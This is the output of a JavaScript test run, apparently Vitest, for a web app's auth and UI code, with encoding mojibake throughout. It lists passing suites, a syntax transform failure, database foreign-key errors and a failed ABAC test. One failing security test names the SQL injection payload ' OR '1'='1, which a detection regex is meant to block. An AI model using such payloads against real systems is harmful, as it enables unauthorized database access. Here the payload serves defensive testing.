stderr | tests/unit/auth/admin-access-control.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/auth/admin-access-control.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/auth/admin-access-control.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/auth/admin-access-control.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/auth/admin-access-control.test.ts [2m([22m[2m5 tests[22m[2m)[22m[33m 11305[2mms[22m[39m
[90mstdout[2m | tests/integration/notifications.test.ts
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜí´©Å secrets for agents: https://dotenvx.com/as2

[90mstdout[2m | tests/integration/notifications.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/sanity.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/integration/loaders/blog-loader.test.ts
Unable to detect dev server port, falling back to 4321
[90mstdout[2m | tests/integration/loaders/blog-loader.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth


[90mstdout[2m | tests/integration/loaders/blog-loader.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/loaders/blog-loader.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/loaders/blog-loader.test.ts [2m([22m[2m5 tests[22m[2m)[22m[33m 11721[2mms[22m[39m
stderr | tests/integration/notifications.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/integration/notifications.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/integration/notifications.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/notifications.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/notifications.test.ts [2m([22m[2m3 tests[22m[2m)[22m[33m 11172[2mms[22m[39m
stderr | tests/sanity.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/sanity.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/sanity.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/sanity.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/sanity.test.ts [2m([22m[2m2 tests[22m[2m)[22m[33m 11033[2mms[22m[39m

ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ» Failed Suites 1 ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»

 FAIL  tests/unit/admin/permissions.test.ts [ tests/unit/admin/permissions.test.ts ]
Error: Transform failed with 1 error:
C:/Users/Utilisateur/Documents/concordia/tests/unit/admin/permissions.test.ts:271:4: ERROR: "await" can only be used inside an "async" function
  Plugin: vite:esbuild
  File: C:/Users/Utilisateur/Documents/concordia/tests/unit/admin/permissions.test.ts:271:4
  
  "await" can only be used inside an "async" function
  269 |  describe('admin/permissions ÔÇö async functions', () => {
  270 |    const { listRolePolicies } = vi.mocked(
  271 |      await import('@lib/admin/policy-store'),
      |      ^
  272 |    );
  273 |    const { reloadAdminAccessControl } = vi.mocked(
  
 ÔØ» failureErrorWithLog node_modules/.pnpm/esbuild@0.27.3/node_modules/esbuild/lib/main.js:1467:15
 ÔØ» node_modules/.pnpm/esbuild@0.27.3/node_modules/esbuild/lib/main.js:736:50
 ÔØ» responseCallbacks.<computed> node_modules/.pnpm/esbuild@0.27.3/node_modules/esbuild/lib/main.js:603:9
 ÔØ» handleIncomingPacket node_modules/.pnpm/esbuild@0.27.3/node_modules/esbuild/lib/main.js:658:12
 ÔØ» Socket.readFromStdout node_modules/.pnpm/esbuild@0.27.3/node_modules/esbuild/lib/main.js:581:7

ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[1/5]ÔÄ»


ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ» Failed Tests 4 ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»

 FAIL  tests/security/security.test.ts > COMBINED_DANGEROUS regex > blocks SQL injection payload: ' OR '1'='1
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 ÔØ» tests/security/security.test.ts:48:46
     46| 
     47|   it.each(securityPayloads.sql)('blocks SQL injection payload: %s', (pÔÇª
     48|     expect(COMBINED_DANGEROUS.test(payload)).toBe(true);
       |                                              ^
     49|   });
     50| 

ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[2/5]ÔÄ»

 FAIL  src/lib/auth/auth.test.ts > Auth - Security & Functionality > Inscription S├®curis├®e > hash password diff├®rent pour m├¬me password
Error: Failed query: insert into "session" ("id", "expires_at", "token", "created_at", "updated_at", "ip_address", "user_agent", "user_id", "active_organization_id", "impersonated_by") values ($1, $2, $3, $4, $5, $6, $7, $8, default, default) returning "id", "expires_at", "token", "created_at", "updated_at", "ip_address", "user_agent", "user_id", "active_organization_id", "impersonated_by"
params: lvO9PC1XhnhgKhQ8UJrOOyZPCIHa5moj,2026-03-15T19:23:07.867Z,seQGmqkXewraTu7SIMVFX8R8eD64MOxH,2026-03-08T19:23:07.867Z,2026-03-08T19:23:07.867Z,,,eDsAL8JZoD0BfOmqTKb2kzcmzYzEHim6
 ÔØ» NodePgPreparedQuery.queryWithCache node_modules/.pnpm/drizzle-orm@0.45.1_@electri_d898f384106bb8bf3de604db7f68a0cd/node_modules/drizzle-orm/pg-core/session.js:41:15
 ÔØ» node_modules/.pnpm/drizzle-orm@0.45.1_@electri_d898f384106bb8bf3de604db7f68a0cd/node_modules/drizzle-orm/node-postgres/session.js:117:22
 ÔØ» withReturning node_modules/.pnpm/@better-auth+drizzle-adapte_917e5f1652c3d4e0047699d2ca74df4b/node_modules/@better-auth/drizzle-adapter/dist/index.mjs:18:45
 ÔØ» Object.create node_modules/.pnpm/@better-auth+drizzle-adapte_917e5f1652c3d4e0047699d2ca74df4b/node_modules/@better-auth/drizzle-adapter/dist/index.mjs:171:12
 ÔØ» Object.create node_modules/.pnpm/@better-auth+core@1.5.4_@be_8bf59ddc52f87e31b34642a64631d3c6/node_modules/@better-auth/core/dist/db/adapter/factory.mjs:424:16
 ÔØ» createWithHooks node_modules/.pnpm/better-auth@1.5.4_@prisma+c_459c0e00e3253d2a17d47f1248cc40a3/node_modules/better-auth/dist/db/with-hooks.mjs:21:66
 ÔØ» Object.createSession node_modules/.pnpm/better-auth@1.5.4_@prisma+c_459c0e00e3253d2a17d47f1248cc40a3/node_modules/better-auth/dist/db/internal-adapter.mjs:162:11
 ÔØ» node_modules/.pnpm/better-auth@1.5.4_@prisma+c_459c0e00e3253d2a17d47f1248cc40a3/node_modules/better-auth/dist/api/routes/sign-up.mjs:254:19
 ÔØ» node_modules/.pnpm/@better-auth+core@1.5.4_@be_02d8339fa39528bd3777c3d31ea171ba/node_modules/@better-auth/core/dist/context/transaction.mjs:62:13

Caused by: error: une instruction insert ou update sur la table ┬½ session ┬╗ viole la contrainte de cl├®
├®trang├¿re ┬½ session_user_id_user_id_fk ┬╗
 ÔØ» node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/client.js:631:17
 ÔØ» node_modules/.pnpm/drizzle-orm@0.45.1_@electri_d898f384106bb8bf3de604db7f68a0cd/node_modules/drizzle-orm/node-postgres/session.js:124:18
 ÔØ» NodePgPreparedQuery.queryWithCache node_modules/.pnpm/drizzle-orm@0.45.1_@electri_d898f384106bb8bf3de604db7f68a0cd/node_modules/drizzle-orm/pg-core/session.js:39:16
 ÔØ» node_modules/.pnpm/drizzle-orm@0.45.1_@electri_d898f384106bb8bf3de604db7f68a0cd/node_modules/drizzle-orm/node-postgres/session.js:117:22
 ÔØ» withReturning node_modules/.pnpm/@better-auth+drizzle-adapte_917e5f1652c3d4e0047699d2ca74df4b/node_modules/@better-auth/drizzle-adapter/dist/index.mjs:18:45
 ÔØ» Object.create node_modules/.pnpm/@better-auth+drizzle-adapte_917e5f1652c3d4e0047699d2ca74df4b/node_modules/@better-auth/drizzle-adapter/dist/index.mjs:171:12
 ÔØ» Object.create node_modules/.pnpm/@better-auth+core@1.5.4_@be_8bf59ddc52f87e31b34642a64631d3c6/node_modules/@better-auth/core/dist/db/adapter/factory.mjs:424:16
 ÔØ» createWithHooks node_modules/.pnpm/better-auth@1.5.4_@prisma+c_459c0e00e3253d2a17d47f1248cc40a3/node_modules/better-auth/dist/db/with-hooks.mjs:21:66
 ÔØ» Object.createSession node_modules/.pnpm/better-auth@1.5.4_@prisma+c_459c0e00e3253d2a17d47f1248cc40a3/node_modules/better-auth/dist/db/internal-adapter.mjs:162:11

ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
Serialized Error: { length: 347, severity: 'ERREUR', code: '23503', detail: 'La cl├® (user_id)=(eDsAL8JZoD0BfOmqTKb2kzcmzYzEHim6) n\'est pas pr├®sente dans la table ┬½ user ┬╗.', hint: undefined, position: undefined, internalPosition: undefined, internalQuery: undefined, where: undefined, schema: 'public', table: 'session', dataType: undefined, constraint: 'session_user_id_user_id_fk', file: 'ri_triggers.c', routine: 'ri_ReportViolation' }
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[3/5]ÔÄ»

 FAIL  src/lib/auth/auth.test.ts > Auth - Security & Functionality > Connexion S├®curis├®e > session unique par device
Error: Failed query: insert into "session" ("id", "expires_at", "token", "created_at", "updated_at", "ip_address", "user_agent", "user_id", "active_organization_id", "impersonated_by") values ($1, $2, $3, $4, $5, $6, $7, $8, default, default) returning "id", "expires_at", "token", "created_at", "updated_at", "ip_address", "user_agent", "user_id", "active_organization_id", "impersonated_by"
params: KNlgsmnd6iLdfjLsTqH2qchckGBsTkbm,2026-03-15T19:23:08.338Z,2Ef3SyzWV1j41z8PVGgkUf1IRtqbLBub,2026-03-08T19:23:08.338Z,2026-03-08T19:23:08.338Z,,,2qkhuLlAzU3hBts85swGIpTOScktnP3r
 ÔØ» NodePgPreparedQuery.queryWithCache node_modules/.pnpm/drizzle-orm@0.45.1_@electri_d898f384106bb8bf3de604db7f68a0cd/node_modules/drizzle-orm/pg-core/session.js:41:15
 ÔØ» node_modules/.pnpm/drizzle-orm@0.45.1_@electri_d898f384106bb8bf3de604db7f68a0cd/node_modules/drizzle-orm/node-postgres/session.js:117:22
 ÔØ» withReturning node_modules/.pnpm/@better-auth+drizzle-adapte_917e5f1652c3d4e0047699d2ca74df4b/node_modules/@better-auth/drizzle-adapter/dist/index.mjs:18:45
 ÔØ» Object.create node_modules/.pnpm/@better-auth+drizzle-adapte_917e5f1652c3d4e0047699d2ca74df4b/node_modules/@better-auth/drizzle-adapter/dist/index.mjs:171:12
 ÔØ» Object.create node_modules/.pnpm/@better-auth+core@1.5.4_@be_8bf59ddc52f87e31b34642a64631d3c6/node_modules/@better-auth/core/dist/db/adapter/factory.mjs:424:16
 ÔØ» createWithHooks node_modules/.pnpm/better-auth@1.5.4_@prisma+c_459c0e00e3253d2a17d47f1248cc40a3/node_modules/better-auth/dist/db/with-hooks.mjs:21:66
 ÔØ» Object.createSession node_modules/.pnpm/better-auth@1.5.4_@prisma+c_459c0e00e3253d2a17d47f1248cc40a3/node_modules/better-auth/dist/db/internal-adapter.mjs:162:11
 ÔØ» Object.login node_modules/.pnpm/better-auth@1.5.4_@prisma+c_459c0e00e3253d2a17d47f1248cc40a3/node_modules/better-auth/dist/plugins/test-utils/auth-helpers.mjs:8:19
 ÔØ» src/lib/auth/auth.test.ts:216:22
    214| 
    215|       // Ô£à Login 2 fois = 2 sessions diff├®rentes
    216|       const login1 = await test.login({ userId: user.id });
       |                      ^
    217|       const login2 = await test.login({ userId: user.id });
    218| 

Caused by: error: une instruction insert ou update sur la table ┬½ session ┬╗ viole la contrainte de cl├®
├®trang├¿re ┬½ session_user_id_user_id_fk ┬╗
 ÔØ» node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/client.js:631:17
 ÔØ» node_modules/.pnpm/drizzle-orm@0.45.1_@electri_d898f384106bb8bf3de604db7f68a0cd/node_modules/drizzle-orm/node-postgres/session.js:124:18
 ÔØ» NodePgPreparedQuery.queryWithCache node_modules/.pnpm/drizzle-orm@0.45.1_@electri_d898f384106bb8bf3de604db7f68a0cd/node_modules/drizzle-orm/pg-core/session.js:39:16
 ÔØ» node_modules/.pnpm/drizzle-orm@0.45.1_@electri_d898f384106bb8bf3de604db7f68a0cd/node_modules/drizzle-orm/node-postgres/session.js:117:22
 ÔØ» withReturning node_modules/.pnpm/@better-auth+drizzle-adapte_917e5f1652c3d4e0047699d2ca74df4b/node_modules/@better-auth/drizzle-adapter/dist/index.mjs:18:45
 ÔØ» Object.create node_modules/.pnpm/@better-auth+drizzle-adapte_917e5f1652c3d4e0047699d2ca74df4b/node_modules/@better-auth/drizzle-adapter/dist/index.mjs:171:12
 ÔØ» Object.create node_modules/.pnpm/@better-auth+core@1.5.4_@be_8bf59ddc52f87e31b34642a64631d3c6/node_modules/@better-auth/core/dist/db/adapter/factory.mjs:424:16
 ÔØ» createWithHooks node_modules/.pnpm/better-auth@1.5.4_@prisma+c_459c0e00e3253d2a17d47f1248cc40a3/node_modules/better-auth/dist/db/with-hooks.mjs:21:66
 ÔØ» Object.createSession node_modules/.pnpm/better-auth@1.5.4_@prisma+c_459c0e00e3253d2a17d47f1248cc40a3/node_modules/better-auth/dist/db/internal-adapter.mjs:162:11

ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
Serialized Error: { length: 347, severity: 'ERREUR', code: '23503', detail: 'La cl├® (user_id)=(2qkhuLlAzU3hBts85swGIpTOScktnP3r) n\'est pas pr├®sente dans la table ┬½ user ┬╗.', hint: undefined, position: undefined, internalPosition: undefined, internalQuery: undefined, where: undefined, schema: 'public', table: 'session', dataType: undefined, constraint: 'session_user_id_user_id_fk', file: 'ri_triggers.c', routine: 'ri_ReportViolation' }
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[4/5]ÔÄ»

 FAIL  src/lib/auth/permissions.test.ts > RBAC/ABAC Security > ABAC - Attribute Based > IP-based restrictions
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 ÔØ» src/lib/auth/permissions.test.ts:93:7
     91|       const internalIP: ABACContext = { userId: 'u1', ip: '10.0.0.1' };
     92|       const externalIP: ABACContext = { userId: 'u1', ip: '203.0.113.1ÔÇª
     93|       await expect(checkPermission(Role.ADMIN, Permission.ADMIN_ACCESSÔÇª
       |       ^
     94|       await expect(checkPermission(Role.ADMIN, Permission.ADMIN_ACCESSÔÇª
     95|     });

ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[5/5]ÔÄ»


[2m  Snapshots [22m [1m[33m67 obsolete[39m[22m
[2m            [22m [90mÔå│[39m [2mtests/unit/components/Accordion/[22m[1mAccordionItem[22m[2m.test.ts[22m
[2m            [22m   [90m┬À[39m AccordionItem component contract > Snapshot 1
[2m            [22m [90mÔå│[39m [2mtests/unit/components/link/[22m[1mLink[22m[2m.test.ts[22m
[2m            [22m   [90m┬À[39m Link Component > should match snapshot > link-basic 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > anchor matches snapshot (button style) 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > anchor matches snapshot (link style) 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > anchor matches snapshot disabled (button style) 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > anchor matches snapshot with left icon 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > anchor matches snapshot with object text 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > anchor matches snapshot with right icon 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > anchor matches snapshot with slot 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > anchor matches snapshot with unicode text 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot <a> > link-a 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot <a> 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot <button> > link-button 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot <button> 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot disabled > link-disabled 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot disabled 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot icon left > link-icon-left 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot icon left 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot icon right > link-icon-right 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot icon right 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot object > link-object 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot object 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot slot > link-slot 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot slot 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot unicode > link-unicode 1
[2m            [22m   [90m┬À[39m Link Component AAA+++ (60 tests) > matches snapshot unicode 1
[2m            [22m   [90m┬À[39m ui/Link > snapshot: default link 1
[2m            [22m [90mÔå│[39m [2mtests/unit/components/Sheet/[22m[1mSheet[22m[2m.test.ts[22m
[2m            [22m   [90m┬À[39m Component: Sheet > renders root sheet element > Sheet-default 1
[2m            [22m [90mÔå│[39m [2mtests/unit/components/Tools/[22m[1mGrid[22m[2m.test.ts[22m
[2m            [22m   [90m┬À[39m Grid component contract (qGRID) > Snapshot 1
[2m            [22m [90mÔå│[39m [2mtests/unit/components/Badge/[22m[1mBadge[22m[2m.test.ts[22m
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: boundary: long string 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: boundary: unicode 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 1 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 2 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 3 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 4 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 5 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 6 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 7 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 8 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 9 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 10 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 11 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 12 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 13 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 14 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 15 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 16 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 17 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 18 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 19 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 20 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 21 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 22 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 23 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 24 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 25 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 26 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 27 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 28 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 29 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 30 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 31 1
[2m            [22m   [90m┬À[39m ui/Badge > Badge - Snapshots > snapshot: combo 32 1
[2m            [22m   [90m┬À[39m ui/Badge > final: snapshot test for regression detection 1
[2m            [22m   [90m┬À[39m ui/Badge > snapshot: alert with all props 1
[2m            [22m   [90m┬À[39m ui/Badge > snapshot: default alert 1
[2m            [22m [90mÔå│[39m [2mtests/unit/components/Slider/[22m[1mSlider[22m[2m.test.ts[22m
[2m            [22m   [90m┬À[39m Component: Slider > renders with default props > Slider-default 1

[2m Test Files [22m [1m[31m4 failed[39m[22m[2m | [22m[1m[32m68 passed[39m[22m[90m (72)[39m
[2m      Tests [22m [1m[31m4 failed[39m[22m[2m | [22m[1m[32m1392 passed[39m[22m[90m (1396)[39m
[2m   Start at [22m 20:22:23
[2m   Duration [22m 712.08s[2m (transform 34.77s, setup 128.40s, import 278.54s, tests 1567.75s, environment 4.36s)[22m

